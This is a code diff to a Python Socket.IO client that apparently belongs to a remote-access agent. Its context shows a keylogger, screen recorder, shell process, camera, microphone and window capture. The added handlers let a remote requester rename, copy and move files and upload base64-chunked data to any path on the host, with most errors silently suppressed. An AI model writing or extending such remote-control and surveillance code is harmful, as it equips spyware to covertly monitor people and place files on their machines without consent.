@@ -24,6 +24,7 @@ _lock = threading.Lock()
 _screen_recorder = None
 _keylogger = None
 _shell_proc = None
+_upload_sessions = {}  # session_id -> {path, tmp, total, received}
 
 
 def init(controller_fn, recorder, camera, mic=None):
@@ -129,6 +130,99 @@ def _make_client():
             sio.emit("delete_result", result)
         except Exception:
             pass
+
+    @sio.on("rename_path")
+    def _on_rename_path(data):
+        try:
+            import file_manager as fm
+            result = fm.rename_path(data.get("path", ""), data.get("new_name", ""))
+            result["_requester"] = data.get("_requester")
+            sio.emit("rename_result", result)
+        except Exception:
+            pass
+
+    @sio.on("copy_path")
+    def _on_copy_path(data):
+        try:
+            import file_manager as fm
+            result = fm.copy_path(data.get("src", ""), data.get("dst", ""))
+            result["_requester"] = data.get("_requester")
+            sio.emit("copy_result", result)
+        except Exception:
+            pass
+
+    @sio.on("move_path")
+    def _on_move_path(data):
+        try:
+            import file_manager as fm
+            result = fm.move_path(data.get("src", ""), data.get("dst", ""))
+            result["_requester"] = data.get("_requester")
+            sio.emit("move_result", result)
+        except Exception:
+            pass
+
+    @sio.on("upload_start")
+    def _on_upload_start(data):
+        try:
+            import tempfile, uuid
+            session_id = uuid.uuid4().hex[:12]
+            path = data.get("path", "")
+            total = data.get("size", 0)
+            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".nora_up")
+            tmp.close()
+            _upload_sessions[session_id] = {
+                "path": path,
+                "tmp": tmp.name,
+                "total": total,
+                "received": 0,
+            }
+            sio.emit("upload_ready", {
+                "session_id": session_id,
+                "_requester": data.get("_requester"),
+            })
+        except Exception as e:
+            sio.emit("upload_result", {
+                "ok": False, "error": str(e),
+                "_requester": data.get("_requester"),
+            })
+
+    @sio.on("upload_chunk")
+    def _on_upload_chunk(data):
+        try:
+            import base64 as _b64, os as _os, shutil
+            session_id = data.get("session_id", "")
+            sess = _upload_sessions.get(session_id)
+            if not sess:
+                sio.emit("upload_result", {
+                    "ok": False, "error": "unknown session",
+                    "_requester": data.get("_requester"),
+                })
+                return
+            raw = _b64.b64decode(data.get("data", ""))
+            with open(sess["tmp"], "ab") as f:
+                f.write(raw)
+            sess["received"] += len(raw)
+            is_last = data.get("last", False)
+            sio.emit("upload_progress", {
+                "session_id": session_id,
+                "received": sess["received"],
+                "total": sess["total"],
+                "_requester": data.get("_requester"),
+            })
+            if is_last:
+                path = sess["path"]
+                _os.makedirs(_os.path.dirname(_os.path.abspath(path)) or ".", exist_ok=True)
+                shutil.move(sess["tmp"], path)
+                del _upload_sessions[session_id]
+                sio.emit("upload_result", {
+                    "ok": True, "path": path,
+                    "_requester": data.get("_requester"),
+                })
+        except Exception as e:
+            sio.emit("upload_result", {
+                "ok": False, "error": str(e),
+                "_requester": data.get("_requester"),
+            })
 
     @sio.on("win_capture_start")
     def _on_win_capture_start(data):
